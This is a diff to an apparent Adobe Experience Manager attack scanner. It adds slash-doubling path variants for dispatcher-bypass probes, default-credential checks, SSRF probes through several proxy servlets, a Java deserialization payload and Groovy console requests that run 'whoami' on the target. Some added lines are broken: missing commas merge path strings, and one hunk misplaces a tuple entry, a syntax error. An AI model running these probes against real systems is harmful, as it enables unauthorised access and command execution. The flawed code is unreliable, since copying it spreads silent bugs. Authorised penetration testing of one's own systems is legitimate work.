@@ -136,7 +136,7 @@ def preflight(url, proxy=None):
 
 @register
 def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
-    GETSERVLET = itertools.product(('/etc', '/var', '/apps', '/home', '///etc', '///var', '///apps', '///home'),
+    GETSERVLET = itertools.product(('/etc', '/var', '/apps', '/home', '///etc', '///var', '///apps', '///home','///etc', '////var', '////apps', '////home'),
                                    ('.json', '.1.json', '.4.2.1....json', '.json/a.css', '.json.html', '.json.css',
                                     '.json/a.html', '.json/a.png', '.json/a.ico', '.json/b.jpeg', '.json/b.gif',
                                     '.json;%0aa.css', '.json;%0aa.png', '.json;%0aa.html', '.json;%0aa.js', '.json/a.js'))
@@ -173,8 +173,10 @@ def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
 def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
     QUERYBUILDER = itertools.product(('/bin/querybuilder.json', '/bin/querybuilder.json.servlet',
                                       '///bin///querybuilder.json', '///bin///querybuilder.json.servlet',
+                                      '////bin///querybuilder.json', '////bin///querybuilder.json.servlet',
                                       '/bin/querybuilder.feed', '/bin/querybuilder.feed.servlet',
                                       '///bin///querybuilder.feed', '///bin///querybuilder.feed.servlet'),
+    								  '////bin///querybuilder.feed', '////bin///querybuilder.feed.servlet'),
                                      ('', '.css', '.ico', '.png', '.gif', '.jpeg', '.html', '.1.json', '.4.2.1...json',
                                       '/a.css', '/a.html', '/a.ico', '/a.png' '/a.js', '/a.1.json', '/a.4.2.1...json',
                                       ';%0aa.css', ';%0aa.png', ';%0aa.js', ';%0aa.html', ';%0aa.ico'))
@@ -255,6 +257,20 @@ def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
         '///bin///wcm///search///gql.json///a.png?query=type:base%20limit:..1&pathPrefix=',
         '///bin///wcm///search///gql.json///a.js?query=type:base%20limit:..1&pathPrefix=',
         '///bin///wcm///search///gql.json///a.html?query=type:base%20limit:..1&pathPrefix='
+        '////bin///wcm///search///gql.servlet.json?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.1.json?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.4.2.1...json?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json;%0aa.css?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json;%0aa.js?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json;%0aa.html?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json;%0aa.png?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json;%0aa.ico?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.css?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.ico?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.png?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.js?query=type:base%20limit:..1&pathPrefix=',
+        '////bin///wcm///search///gql.json///a.html?query=type:base%20limit:..1&pathPrefix='
     )
 
     results = []
@@ -316,7 +332,7 @@ def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
     CREDS = ('admin:admin', 'author:author', 'replication-receiver:replication-receiver', 'vgnadmin:vgnadmin',
              'aparker@geometrixx.info:aparker', 'jdoe@geometrixx.info:jdoe')
 
-    LOGINSTATUS = itertools.product(('/system/sling/loginstatus', '///system///sling///loginstatus'),
+    LOGINSTATUS = itertools.product(('/system/sling/loginstatus', '///system///sling///loginstatus', '////system///sling///loginstatus'),
                                     ('.json', '.css', '.ico', '.png', '.gif', '.html', '.js', '.json/a.1.json',
                                      '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.js', '.json;%0aa.png',
                                      '.json;%0aa.ico', '.4.2.1...json'))
@@ -353,7 +369,7 @@ def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
-    FELIXCONSOLE = itertools.product(('/system/console/bundles', '///system///console///bundles'),
+    FELIXCONSOLE = itertools.product(('/system/console/bundles', '///system///console///bundles', '////system///console///bundles'),
                                     ('', '.json', '.1.json', '.4.2.1...json', '.css', '.ico', '.png', '.gif', '.html', '.js',
                                      ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.png', '.json;%0aa.ico', '.servlet/a.css',
                                      '.servlet/a.js', '.servlet/a.html', '.servlet/a.ico', '.servlet/a.png'))
@@ -382,7 +398,7 @@ def exposed_felix_console(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
-    WCMDEBUG = itertools.product(('/', '/content', '/content/dam'),
+    WCMDEBUG = itertools.product(('/', '/content', '/content/dam', '////content', '////content/dam'),
                                  ('.json', '.1.json', '.json.html', '.json.css', '.json.js', '.4.2.1...json', '.json/a.css',
                                   '.json/a.html', '.json/a.png', '.json/a.ico', '.json/a.js', '.json/b.gif', '.json%0aa.css',
                                   '.json%0aa.html', '.json%0aa.png', '.json%0aa.ico'),
@@ -412,7 +428,7 @@ def exposed_wcmdebug_filter(base_url, my_host, debug=False, proxy=None):
 @register
 def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
     WCMSUGGESTIONS = itertools.product(
-        ('/bin/wcm/contentfinder/connector/suggestions', '///bin///wcm///contentfinder///connector///suggestions'),
+        ('/bin/wcm/contentfinder/connector/suggestions', '///bin///wcm///contentfinder///connector///suggestions', '////bin///wcm///contentfinder///connector///suggestions'),
         ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css', '.json/a.css',
          '.json/a.png', '.json/a.html', '.4.2.1...json'),
         ('?query_term=path%3a/&pre=<1337abcdef>&post=yyyy',)
@@ -441,7 +457,7 @@ def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_auditlog_servlet(base_url, my_host, debug=False, proxy=None):
-    AUDITLOG = itertools.product(('/bin/msm/audit', '///bin///msm///audit'),
+    AUDITLOG = itertools.product(('/bin/msm/audit', '///bin///msm///audit', '////bin///msm///audit'),
                                  ('.json', '.css', '.html', '.ico', '.png', '.gif', '.json/a.1.json', '.json;%0aa.css',
                                   '.4.2.1...json', '.json/a.css', '.json/a.html', '.json/a.png', '.json;%0aa.html'))
     AUDITLOG = list('{0}{1}'.format(p1, p2) for p1, p2 in AUDITLOG)
@@ -474,7 +490,7 @@ def exposed_auditlog_servlet(base_url, my_host, debug=False, proxy=None):
 @register
 def exposed_crxde_logs(base_url, my_host, debug=False, proxy=None):
     CRXDELOGS = itertools.product(
-        ('/bin/crxde/logs{0}?tail=100', '///bin///crxde///logs{0}?tail=100'),
+        ('/bin/crxde/logs{0}?tail=100', '///bin///crxde///logs{0}?tail=100', '////bin///crxde///logs{0}?tail=100'),
         ('', '.json', '.1.json', '.4.2.1...json', '.html', ';%0aa.css', ';%0aa.html', ';%0aa.js',
          ';%0aa.ico', ';%0aa.png', '/a.css', '/a.html', '/a.png', '/a.js', '/a.ico')
     )
@@ -502,19 +518,19 @@ def exposed_crxde_logs(base_url, my_host, debug=False, proxy=None):
 @register
 def exposed_crxde_crx(base_url, my_host, debug=False, proxy=None):
     CRXDELITE = itertools.product(
-        ('/crx/de/index.jsp', '///crx///de///index.jsp'),
+        ('/crx/de/index.jsp', '///crx///de///index.jsp','////crx///de///index.jsp'),
         ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
     )
     CRXDELITE = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXDELITE)
 
     CRX = itertools.product(
-        ('/crx/explorer/browser/index.jsp', '///crx///explorer///browser///index.jsp'),
+        ('/crx/explorer/browser/index.jsp', '/crx/explorer/index.jsp', '///crx/explorer/index.jsp', '////crx/explorer/index.jsp','///crx///explorer///browser///index.jsp','////crx///explorer///browser///index.jsp'),
         ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
     )
     CRX = list('{0}{1}'.format(p1, p2) for p1, p2 in CRX)
 
     PACKMGR = itertools.product(
-        ('/crx/packmgr/index.jsp', '///crx///packmgr///index.jsp'),
+        ('/crx/packmgr/index.jsp', '///crx///packmgr///index.jsp','////crx///packmgr///index.jsp'),
         ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
     )
     PACKMGR = list('{0}{1}'.format(p1, p2) for p1, p2 in PACKMGR)
@@ -548,8 +564,10 @@ def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
+            '////libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
             '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
+            '////libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
         ),
         (
             '.json', '.1.json', '.4.2.1...json', '.html'
@@ -561,8 +579,10 @@ def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
+            '////libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
             '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
+            '////libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
         ),
         (
            '.html/{0}.1.json', '.html/{0}.4.2.1...json', '.html/{0}.css', '.html/{0}.js', '.html/{0}.png', '.html/{0}.bmp',
@@ -577,8 +597,10 @@ def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
+            '////libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
             '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23',
             '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
+            '////libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'
         ),
         (
             '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
@@ -633,6 +655,13 @@ def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
         '///libs///cq///contentinsight///proxy///reportingservices.json?url={0}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a'
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a'
     )
 
     REPOSTINGSERVICESSERVLET2 = (
@@ -666,6 +695,21 @@ def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
         '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a'
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.gif?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a'
     )
     cache_buster = random_string()
     REPOSTINGSERVICESSERVLET2 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET2)
@@ -677,12 +721,18 @@ def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
         '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
         '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
         '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
-        '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
+		'///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
         '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a'
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a',
+        '////libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a'
     )
     cache_buster = randint(0, 2**12)
     REPOSTINGSERVICESSERVLET3 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET3)
@@ -734,6 +784,14 @@ def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy'
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.html?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.1.json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.4.2.1...json?datacenter={0}%23&company=xxx&username=zzz&secret=yyyy'
     )
 
     SITECATALYST2 = (
@@ -773,6 +831,24 @@ def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.bmp?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.ico?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
     )
     cache_buster = random_string()
     SITECATALYST2 = (path.format(cache_buster) for path in SITECATALYST2)
@@ -788,6 +864,11 @@ def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
         '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
         '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.gif?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
+        '///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.css?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.js?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.html?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.png?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy',
+        '////libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.gif?datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy'
     )
     cache_buster = randint(1, 2**12)
     SITECATALYST3 = (path.format(cache_buster) for path in SITECATALYST3)
@@ -828,6 +909,7 @@ def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
             '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
+            '////libs///cq///cloudservicesprovisioning///content///autoprovisioning'
         ),
         (
             '.json', '.4.2.1...json', '.1.json', '.html', '.html/a.1.json', '.html/a.4.2.1...json'
@@ -839,6 +921,7 @@ def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
             '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
+            '////libs///cq///cloudservicesprovisioning///content///autoprovisioning'
         ),
         (
             '.json;%0a{0}.css', '.json;%0a{0}.png', '.html;%0a{0}.css', '.html;%0a{0}.png', '.json/{0}.css', '.json/{0}.js',
@@ -853,6 +936,7 @@ def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
         (
             '/libs/cq/cloudservicesprovisioning/content/autoprovisioning',
             '///libs///cq///cloudservicesprovisioning///content///autoprovisioning'
+            '////libs///cq///cloudservicesprovisioning///content///autoprovisioning'
         ),
         (
             '.{0}.css', '.{0}.js', '.{0}.ico', '.{0}.png', '.{0}.jpeg', '.{0}.gif'
@@ -901,6 +985,8 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
             '/libs/shindig/proxy{0}?container=default&url={{0}}',
             '///libs///opensocial///proxy{0}?container=default&url={{0}}',
             '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '////libs///opensocial///proxy{0}?container=default&url={{0}}',
+            '////libs///shindig///proxy{0}?container=default&url={{0}}'
         ),
         (
             '', '.json', '.1.json', '.4.2.1...json', '.html'
@@ -914,6 +1000,8 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
             '/libs/shindig/proxy{0}?container=default&url={{0}}',
             '///libs///opensocial///proxy{0}?container=default&url={{0}}',
             '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '////libs///opensocial///proxy{0}?container=default&url={{0}}',
+            '////libs///shindig///proxy{0}?container=default&url={{0}}'
         ),
         (
            '/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js',
@@ -929,6 +1017,8 @@ def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
             '/libs/shindig/proxy{0}?container=default&url={{0}}',
             '///libs///opensocial///proxy{0}?container=default&url={{0}}',
             '///libs///shindig///proxy{0}?container=default&url={{0}}'
+            '////libs///opensocial///proxy{0}?container=default&url={{0}}',
+            '////libs///shindig///proxy{0}?container=default&url={{0}}'
         ),
         (
             '.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'
@@ -1007,7 +1097,7 @@ def swf_xss(base_url, my_host, debug=False, proxy=None):
 def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
     DESERPAYLOAD = base64.b64decode('rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=')  # Generated with oisdos - java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap
 
-    EXTERNALJOBSERVLET = itertools.product(('/libs/dam/cloud/proxy', '///libs///dam///cloud///proxy'),
+    EXTERNALJOBSERVLET = itertools.product(('/libs/dam/cloud/proxy', '///libs///dam///cloud///proxy','////libs///dam///cloud///proxy'),
                                            ('.json', '.css', '.js', '.html', '.ico', '.png', '.gif', '.1.json',
                                             '.4.2.1...json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.ico'))
     EXTERNALJOBSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in EXTERNALJOBSERVLET)
@@ -1070,21 +1160,21 @@ def exposed_groovy_console(base_url, my_host, debug=False, proxy=None):
     SCRIPT = 'def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22'  # 'def+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.text'
 
     GROOVYSCRIPT1 = itertools.product(
-        ('/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet'),
+        ('/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet','////bin///groovyconsole///post.servlet'),
         ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
          ';%0aa.js', ';%0aa.ico', ';%0aa.png')
     )
     GROOVYSCRIPT1 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT1)
 
     GROOVYSCRIPT2 = itertools.product(
-        ('/etc/groovyconsole/jcr:content.html', '///etc///groovyconsole///jcr:content.html'),
+        ('/etc/groovyconsole/jcr:content.html', '///etc///groovyconsole///jcr:content.html','////etc///groovyconsole///jcr:content.html'),
